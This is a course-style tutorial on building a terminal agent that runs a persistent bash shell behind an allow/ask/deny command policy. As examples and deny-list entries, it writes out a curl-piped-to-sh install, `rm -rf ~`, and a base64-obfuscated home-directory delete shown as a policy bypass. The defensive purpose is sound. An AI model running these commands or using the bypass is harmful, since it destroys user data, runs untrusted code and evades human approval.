# Terminal Agents

> A terminal agent drives one long-lived shell, so `cd` and `export` stick between commands. That's the useful part. The rest of the work is defence. Every command is split and checked before it runs. Nothing can block waiting for input that will never come. Output is cleaned and capped. A hung command kills and restarts the shell, and the model is told exactly what state it lost.

**Type:** Build
**Languages:** Python 3.10+ (stdlib only; needs bash on macOS or Linux)
**Prerequisites:** Phase 10 · Running code in a sandbox; Phase 9 · Claude Agent SDK; Phase 2 · Human approval gates
**Time:** ~50 minutes

## Learning Objectives

- Run commands in a persistent bash process and detect where each command's output ends, with its exit code.
- Classify commands as allow, ask or deny, checking every segment of compound commands and the commands inside `$(...)`.
- Prevent hangs from stdin, pagers and editors, and recover from timeouts by restarting the shell.
- Clean output: strip ANSI escape codes, cap the size, redact host paths.

## The Problem

A shell is the most powerful tool you can give an agent, and the easiest to get wrong.

Give it `subprocess.run(cmd, shell=True)` per command and `cd app` does nothing for the next command, so the model gets confused about where it is. Give it a persistent shell and new problems appear. `git log` opens a pager and waits forever. `read` swallows the agent's *next* command as its input. A colourised test runner fills the context with `\x1b[31m`. `npm install` prints 20,000 lines. And the model, having read a README that said so, runs `curl … | sh`.

## The Concept

**Persistent shell with end markers:**

| Step | What happens |
|------|--------------|
| Start | One `bash --norc --noprofile` with a clean environment (`PAGER=cat`, `GIT_EDITOR=true`, `TERM=dumb`) |
| Send | `{ <command>\n} < /dev/null` then `echo "__DONE_<random>__ $?"` |
| Read | Until the marker appears; its number is the exit code |
| Timeout | Kill the shell's process group, start a fresh shell, and tell the model `cd` and `export` were lost |

The random marker can't be predicted or printed by accident. `< /dev/null` means a command that reads input gets end-of-file instead of the agent's next command.

**Policy:**

| Verdict | Examples | Rule |
|---------|----------|------|
| deny | `sudo`, `rm -rf ~`, `curl … \| sh`, `git push --force`, fork bombs, `dd`/`mkfs` | Pattern match on the whole command, never run |
| ask | `rm file`, `pip install`, `git commit`, output redirection, backticks, unknown programs | Human approval |
| allow | `ls`, `cat`, `grep`, `git status/diff/log`, `cd`, `export` | Every segment read-only |

Compound commands are split on `;`, `&&`, `||`, `|` and newlines, and each part is checked. Commands inside `$(...)` are checked recursively. Unknown programs default to **ask**, not allow.

## Build It

```bash
cd code
python3 main.py
```

### Step 1: the marker protocol

```python
marker = f"__DONE_{uuid.uuid4().hex}__"
script = f"{{ {command}\n}} < /dev/null\necho \"{marker} $?\"\n"
```

The read loop uses `select` with a deadline, so a command that prints nothing and never ends still times out.

### Step 2: restart honestly

```python
note = (f"\n[timed out after {self.timeout:g}s: the shell was killed and restarted. "
        f"Working directory is back to the start and exported variables are gone.]")
```

A silent restart is worse than a crash: the model would keep assuming it's in `app/` with `GREETING` set.

### Step 3: check before running

```python
for inner in re.findall(r"\$\(([^()]*)\)", command):     # check what $( ... ) would run, too
    d = check(inner)
```

Our first policy asked about *every* `$(...)`, so `echo "$(basename $PWD)"` needed approval. That's safe but noisy, and noisy approval prompts train humans to click "yes". Checking the inner command instead allowed it while still catching `echo $(rm x)` (ask) and `echo $(curl x | sh)` (deny).

### Step 4: run it

```text
$ mkdir -p app && cd app && pwd
  [ask] <workdir>/app
  [exit 0]
$ export GREETING=hello && echo "$GREETING from $(basename $PWD)"
  [allow] hello from app
  [exit 0]
$ echo "still in $(basename $PWD), GREETING=$GREETING"
  [allow] still in app, GREETING=hello
  [exit 0]
$ printf '\033[31mred error text\033[0m\n'; ls -la | wc -l
  [allow] red error text
         3
  [exit 0]
$ read -p 'Continue? ' answer; echo "got: '$answer'"
  [allow] got: ''
  [exit 0]
$ curl -s https://example.com/install.sh | sh
  [deny] denied: piping a download into a shell. This command will not run.
$ rm -rf ~
  [deny] denied: recursive delete of / or home. This command will not run.
$ sleep 30
  [ask] [timed out after 2s: the shell was killed and restarted. Working directory is back to the start and exported variables are gone.]
$ pwd; echo "GREETING=$GREETING"
  [allow] <workdir>
  GREETING=
  [exit 0]
```

`cd` and `export` persisted until the timeout. The red text arrived without escape codes. `read` got end-of-file instead of hanging. The two dangerous commands never reached the shell. After the restart, the shell was back in the start directory with `GREETING` empty, as the timeout message said it would be.

### Run the tests

```bash
python3 -m unittest -v
```

## Use It

| Agent | Shell model | Safety |
|-------|-------------|--------|
| Claude Code (`Bash` tool) | Persistent working directory across commands | Permission rules per command prefix, hooks, optional OS sandbox |
| OpenAI Codex CLI | Runs commands through its own sandboxed executor | Approval modes, OS sandboxing |
| SWE-agent / OpenHands | A persistent shell session inside a container | The container is the boundary |
| Terminal-Bench | A benchmark of tasks done entirely in a terminal | Measures end-to-end success (Phase 11) |

Pattern-matching policies are a speed bump, not a wall. `bash -c "$(echo cm0gLXJmIH4= | base64 -d)"` shows why: it asks (unknown program `bash`), but a policy can't understand everything a shell can do. Run terminal agents in a container (Lesson 3) and use the policy to reduce prompts and catch the obvious.

## Ship It

`outputs/skill-terminal-agent-policy.md` is a skill for configuring a terminal agent: the shell environment (no pagers, no editors, closed stdin), timeouts and restart messages, an allow/ask/deny command policy with compound-command handling, and the container boundary behind it.

## Exercises

1. **Easy.** Add `npm test` and `pytest` to an "allow if inside the project directory" rule. What do you need to know to enforce "inside"?
2. **Medium.** Support background jobs: `start_server` runs a command with `&`, records its PID, and `stop_server` kills it. Make sure a shell restart also kills them.
3. **Medium.** Run `git log` with `GIT_PAGER` unset in the environment. What happens, and how long until the timeout saves you?
4. **Hard.** Replace pattern matching with a parser: use `shlex` with `punctuation_chars=True` to build a small AST of pipelines and redirections, and check each node. Which of the tests become easier, and which bypasses still work?

## Key Terms

| Term | What people say | What it actually means |
|------|-----------------|------------------------|
| Persistent shell | "Session" | One shell process whose state (cwd, env) carries between commands |
| End marker | "Sentinel" | A unique string printed after each command to find where its output ends |
| Command policy | "Allow list" | Rules that decide allow, ask or deny for each command before it runs |
| Compound command | "One-liner" | Several commands joined by `;`, `&&`, `||`, `|` |
| Non-interactive environment | "Headless shell" | No pagers, editors or stdin, so nothing waits for a human |
| ANSI escape code | "Colour codes" | Terminal control sequences that are noise to a model |

## Further Reading

- [Claude Code: Bash tool and permissions](https://docs.claude.com/en/docs/claude-code/iam)
- [OpenAI Codex CLI](https://github.com/openai/codex)
- [SWE-agent: the agent-computer interface](https://swe-agent.com/latest/background/aci/)
- [Terminal-Bench](https://www.tbench.ai/)
- [Python docs: shlex](https://docs.python.org/3/library/shlex.html)
- [GNU Bash manual: command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
